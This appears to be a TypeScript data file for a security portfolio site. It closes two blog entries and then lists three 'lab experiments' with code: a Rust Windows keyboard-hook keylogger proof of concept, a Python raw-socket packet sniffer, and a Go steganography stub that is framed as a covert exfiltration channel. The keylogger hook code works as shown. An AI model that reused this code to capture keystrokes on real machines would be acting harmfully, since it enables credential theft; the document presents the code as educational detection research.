*   **Heuristics Engine**: The core logic that scores URLs.
*   **Allow/Deny Lists**: Centralized management of threat intelligence.
*   **Networking Logic**: (Or lack thereof, since it's offline).

### The Result

We achieved ~52% code sharing across 5 platforms, meaning a single developer can audit the security core once and deploy fixes everywhere instantly.
    `
  },
  {
    slug: "electron-security",
    title: "Securing Electron Apps: A Practical Guide",
    date: "2024-12-20",
    tag: "Electron",
    takeaway: "Handling secrets and IPC securely in modern desktop apps.",
    content: `
## The Electron Security Problem

Electron apps are essentially web pages with Node.js access. This is a terrifying combination if not sandboxed correctly.

### Critical Defenses in GitSwitch

1.  **Context Isolation**: Enabled. This ensures the preload script runs in a separate context.
2.  **Sandbox**: Enabled. Renderers have no Node.js access.
3.  **IPC Security**: We use strict \`ipcMain.handle\` and \`ipcRenderer.invoke\` patterns with validated channels.

### Handling Secrets

Never store secrets in \`localStorage\`. GitSwitch uses the OS native Keychain (via \`keytar\`) to store GitHub Personal Access Tokens, ensuring they are encrypted at rest.
    `
  }
];

export interface LabExperiment {
  id: string;
  title: string;
  status: "ACTIVE" | "ARCHIVED" | "CONCEPT";
  description: string;
  tech: string[];
  link?: string;
  objective: string;
  constraints: string;
  codeSnippet: string;
}

export const labExperiments: LabExperiment[] = [
  {
    id: "001",
    title: "Rust Keylogger PoC",
    status: "ARCHIVED",
    description: "A Windows-based keylogger demonstrating the usage of `SetWindowsHookEx` and proper hook chaining for educational detection analysis.",
    tech: ["Rust", "WinAPI", "Unsafe"],
    link: "https://github.com/Raoof128",
    objective: "Understand how Windows messaging hooks can be abused for credential interception and how EDRs detect hook injection.",
    constraints: "Educational purpose only. Does not persist across reboots. Logs to stdout only.",
    codeSnippet: `
// WinAPI Hook Structure (Simplified)
unsafe extern "system" fn hook_callback(code: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT {
    if code >= 0 && wParam.0 as u32 == WM_KEYDOWN {
        let kbd_struct = *(lParam.0 as *const KBDLLHOOKSTRUCT);
        // Process virtual key code
        println!("Key Intercepted: {}", kbd_struct.vkCode);
    }
    // Always pass to next hook in chain to avoid breaking input
    CallNextHookEx(HOOK_HANDLE, code, wParam, lParam)
}

fn main() {
    let hook_id = unsafe {
        SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(hook_callback),
            std::ptr::null_mut(),
            0
        )
    };
    // Pump messages to keep hook alive
    let mut msg = MSG::default();
    while unsafe { GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) } > 0 {
        unsafe {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }
}`
  },
  {
    id: "002",
    title: "Raw Socket Packet Sniffer",
    status: "ACTIVE",
    description: "Python script utilizing raw sockets to capture and analyze TCP/IP headers. Implements basic signature matching for identifying SYN scans.",
    tech: ["Python", "Networking", "Scapy"],
    link: "https://github.com/Raoof128",
    objective: "Manually parse IP/TCP headers to understand protocol structures and detect scanning patterns without relying on Wireshark.",
    constraints: "Requires root/admin privileges. Promiscuous mode enabled.",
    codeSnippet: `
import socket
import struct

def sniff():
    # Create a raw socket bound to all interfaces
    # AF_PACKET is Linux specific. For Windows use AF_INET + IP_HDRINCL
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    
    while True:
        raw_data, addr = s.recvfrom(65535)
        eth_header = raw_data[:14]
        
        # Unpack Ethernet Frame
        dest, src, proto = struct.unpack('! 6s 6s H', eth_header)
        
        # Check for IPv4 (0x0800)
        if socket.ntohs(proto) == 8:
            ip_header = raw_data[14:34]
            # Unpack IP Header (Version, IHL, TTL, Protocol, Source, Dest)
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
            
            version_ihl = iph[0]
            ihl = version_ihl & 0xF
            
            print(f"Packet: {addr} | IHL: {ihl} | Protocol: {iph[6]}")
`
  },
  {
    id: "003",
    title: "Steganography Tool",
    status: "CONCEPT",
    description: "LSB (Least Significant Bit) image steganography implementation in Go. Hides encrypted payloads within PNG pixel data.",
    tech: ["Go", "Cryptography", "Image Processing"],
    link: "https://github.com/Raoof128",
    objective: "Implement a covert channel for data exfiltration by modifying the least significant bits of image pixel data.",
    constraints: "Payload size limited by image dimensions. Not robust against compression.",
    codeSnippet: `
package main

import (
	"image"
	"image/color"
)

// EmbedHides payload bits into the LSB of image pixels
func Embed(img image.Image, payload []byte) image.Image {
	bounds := img.Bounds()
	newImg := image.NewRGBA(bounds)
    
    // ... bit manipulation logic ...
    
	for y := bounds.Min.Y; y < bounds.Max.Y; y++ {
		for x := bounds.Min.X; x < bounds.Max.X; x++ {
			r, g, b, a := img.At(x, y).RGBA()
            
            // Modify 'r' (red channel) LSB with payload bit
            // r = (r & 0xFE) | next_bit
            
			newImg.Set(x, y, color.RGBA{uint8(r), uint8(g), uint8(b), uint8(a)})
		}
	}
	return newImg
}`
  }
];